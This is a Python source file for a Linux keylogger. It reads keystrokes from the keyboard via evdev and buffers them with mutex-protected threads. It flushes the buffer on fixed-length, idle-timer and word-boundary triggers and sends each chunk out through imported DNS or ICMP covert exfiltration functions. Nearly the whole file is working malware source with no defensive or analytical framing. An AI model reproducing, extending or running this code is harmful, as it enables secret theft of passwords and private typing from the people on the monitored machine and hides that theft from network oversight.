import evdev
from evdev import InputDevice, categorize, ecodes
import threading
import queue
import time

# --- EXFILTRATION MODULES ---
from dns_exfil import send_data_over_dns
from icmp_exfil import send_data_over_icmp

# ============================================================
#   SHARED STATE — protected by buffer_lock (Mutex)
# ============================================================
keystroke_buffer  = []          # Shared buffer (list of chars)
last_keystroke_time = time.time()  # Timestamp of most recent keystroke
buffer_lock       = threading.Lock()  # Mutex — only one thread touches buffer at a time
shift_held        = False              # Tracks whether Shift is currently pressed

# ============================================================
#   TRANSMISSION QUEUE  (decouples capture from network I/O)
# ============================================================
packet_queue = queue.Queue()

# ============================================================
#   CONFIGURATION
# ============================================================
MAX_BUFFER_SIZE = 15      # Trigger 1: fixed-length flush threshold
IDLE_TIMEOUT    = 5.0     # Trigger 2: idle-timer flush (seconds)
WORD_BOUNDARIES = {"[S]", "[E]"}  # Trigger 3: semantic delimiters


# ============================================================
#   HELPER — flush buffer (MUST be called while holding lock)
# ============================================================
def _flush_buffer(reason: str):
    """
    Joins the buffer into a string, enqueues it for transmission,
    then clears the buffer.
    Must be called with buffer_lock already held.
    """
    global keystroke_buffer
    if not keystroke_buffer:
        return  # Nothing to flush

    payload = "".join(keystroke_buffer)
    print(f"\n[+] [{reason}] Queueing → '{payload}'")
    packet_queue.put(payload)
    keystroke_buffer = []   # Reset in-place


# ============================================================
#   THREAD 1 — Exfiltration Worker
#   Sends queued payloads over the covert channel.
#   Runs independently so network I/O never blocks keystroke capture.
# ============================================================
def exfiltration_worker():
    while True:
        data_chunk = packet_queue.get()   # Blocks until data is available

        if data_chunk is None:            # Graceful shutdown signal
            break

        try:
            # --- Active exfiltration method ---
            # Toggle comment to switch channel:
            #send_data_over_icmp(data_chunk)
            send_data_over_dns(data_chunk)
        except Exception as e:
            print(f"[-] Exfiltration Error: {e}")

        packet_queue.task_done()


# ============================================================
#   THREAD 2 — Idle Timer Watcher  (Trigger 2)
#   Flushes the buffer if the user stops typing for IDLE_TIMEOUT seconds.
#   Uses the Mutex to safely read/clear the shared buffer.
# ============================================================
def idle_timer_worker():
    global last_keystroke_time
    while True:
        time.sleep(1)  # Poll every second

        # Read timestamp outside lock first (cheap, avoids holding lock during sleep)
        idle_seconds = time.time() - last_keystroke_time

        if idle_seconds >= IDLE_TIMEOUT:
            with buffer_lock:
                # Re-check buffer inside lock — state may have changed while we waited
                if keystroke_buffer:
                    _flush_buffer("IDLE TIMER")
                    # Reset timestamp so we don't fire again immediately
                    last_keystroke_time = time.time()


# ============================================================
#   DEVICE DETECTION
# ============================================================
def find_keyboard_path():
    """Auto-detects the first keyboard-like input device."""
    try:
        devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
        for device in devices:
            if "keyboard" in device.name.lower():
                print(f"[*] Auto-detected Keyboard: {device.name} at {device.path}")
                return device.path
        print("[-] No keyboard found automatically!")
        return None
    except Exception as e:
        print(f"[-] Error searching for devices: {e}")
        return None


# ============================================================
#   START BACKGROUND THREADS
# ============================================================
exfil_thread = threading.Thread(target=exfiltration_worker, daemon=True)
exfil_thread.start()

timer_thread = threading.Thread(target=idle_timer_worker, daemon=True)
timer_thread.start()


# ============================================================
#   MAIN — Keystroke Capture Loop
# ============================================================
KEYBOARD_EVENT = find_keyboard_path()

if not KEYBOARD_EVENT:
    print("[!] Auto-detection failed. Check devices using 'sudo evtest' or 'ls /dev/input/by-path/'.")
    exit()

try:
    keyboard = InputDevice(KEYBOARD_EVENT)
    print(f"[+] Listening on {KEYBOARD_EVENT}")
    print(f"[+] Hybrid Exfiltration Active → Buffer={MAX_BUFFER_SIZE} | Idle={IDLE_TIMEOUT}s | Word-Boundary=ON")

    for event in keyboard.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            # --- Track Shift key state (key_down AND key_up) ---
            raw_key = key_event.keycode
            if isinstance(raw_key, list):
                raw_key = raw_key[0]
            raw_key = str(raw_key).replace("KEY_", "")

            if "SHIFT" in raw_key:
                if key_event.keystate == key_event.key_down:
                    shift_held = True    # Shift pressed
                elif key_event.keystate == key_event.key_up:
                    shift_held = False   # Shift released
                # key_hold (2) — finger still on Shift, ignore to preserve state
                continue  # Shift itself is not a character — move on

            # Only act on key-down events for all other keys
            if key_event.keystate != key_event.key_down:
                continue

            # --- Shift map: evdev key name → shifted symbol (US layout) ---
            SHIFT_MAP = {
                "1": "!", "2": "@", "3": "#", "4": "$",  "5": "%",
                "6": "^", "7": "&", "8": "*", "9": "(",  "0": ")",
                "MINUS": "_",      "EQUAL": "+",
                "LEFTBRACE": "{",  "RIGHTBRACE": "}",
                "BACKSLASH": "|",  "SEMICOLON": ":",
                "APOSTROPHE": '"', "COMMA": "<",
                "DOT": ">",        "SLASH": "?",
                "GRAVE": "~",
            }

            # --- No-shift map: evdev key name → unshifted symbol (US layout) ---
            NOSHIFT_MAP = {
                "MINUS": "-",      "EQUAL": "=",
                "LEFTBRACE": "[",  "RIGHTBRACE": "]",
                "BACKSLASH": "\\", "SEMICOLON": ";",
                "APOSTROPHE": "'", "COMMA": ",",
                "DOT": ".",        "SLASH": "/",
                "GRAVE": "`",
            }

            # --- Normalize the key name ---
            clean_key = raw_key

            if   clean_key == "SPACE":     clean_key = "[S]"
            elif clean_key == "ENTER":     clean_key = "[E]"
            elif clean_key == "BACKSPACE": clean_key = "<"
            elif clean_key == "TAB":       clean_key = "[T]"
            elif shift_held:
                # Shift + letter → uppercase
                if len(clean_key) == 1 and clean_key.isalpha():
                    clean_key = clean_key.upper()
                # Shift + punctuation/number → special character via SHIFT_MAP
                elif clean_key in SHIFT_MAP:
                    clean_key = SHIFT_MAP[clean_key]
                # Everything else with shift (e.g. F-keys): keep as-is
            else:
                # No shift — lowercase letters stay lowercase
                if len(clean_key) == 1 and clean_key.isalpha():
                    clean_key = clean_key.lower()
                # No shift — punctuation keys resolved via NOSHIFT_MAP
                elif clean_key in NOSHIFT_MAP:
                    clean_key = NOSHIFT_MAP[clean_key]

            # --------------------------------------------------------
            #   CRITICAL SECTION — acquire Mutex before touching buffer
            # --------------------------------------------------------
            with buffer_lock:
                last_keystroke_time = time.time()   # Reset idle timer
                keystroke_buffer.append(clean_key)

                print(f"  Buffer: {''.join(keystroke_buffer)!r:<20}", end="\r")

                # --- Trigger 3: Word-Boundary ---
                # [S] and [E] are appended FIRST so the receiver sees
                # the complete word + delimiter in the same packet.
                if clean_key in ("[S]", "[E]"):
                    _flush_buffer("WORD BOUNDARY")

                # --- Trigger 1: Fixed-Length Buffer ---
                elif len(keystroke_buffer) >= MAX_BUFFER_SIZE:
                    _flush_buffer("BUFFER FULL")

                # If neither trigger fires, keep accumulating (idle timer will catch it)

except KeyboardInterrupt:
    print("\n[+] Keylogger stopped. Flushing remaining buffer...")

    # Flush whatever is left in the buffer
    with buffer_lock:
        _flush_buffer("SHUTDOWN")

    # Signal the exfiltration worker to exit cleanly after finishing its queue
    packet_queue.put(None)

    print("[+] Waiting for pending exfiltration to finish (press Ctrl+C again to force quit)...")
    try:
        packet_queue.join()   # Blocks until all queued items are processed
        print("[+] Clean exit.")
    except KeyboardInterrupt:
        # User pressed Ctrl+C a second time — force quit immediately
        print("\n[!] Forced exit. Some queued data may not have been sent.")
        exit(1)

except OSError:
    print(f"\n[!] Cannot access {KEYBOARD_EVENT}. Run with 'sudo'.")

except Exception as e:
    print(f"\n[!] Unexpected Error: {e}")
